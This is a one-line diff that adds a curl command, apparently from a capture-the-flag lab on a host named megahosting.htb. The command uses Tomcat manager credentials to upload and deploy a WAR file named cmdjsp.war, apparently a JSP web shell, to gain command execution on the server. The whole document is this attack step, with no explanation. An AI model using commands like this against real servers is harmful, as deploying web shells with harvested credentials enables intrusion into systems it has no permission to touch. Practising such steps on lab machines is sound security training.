@@ -1,0 +1,1 @@
+curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file /media/sf_stuff/ctf/tabby/cmdjsp.war 'http://megahosting.htb:8080/manager/text/deploy?path=/cmdjsp&update=true'
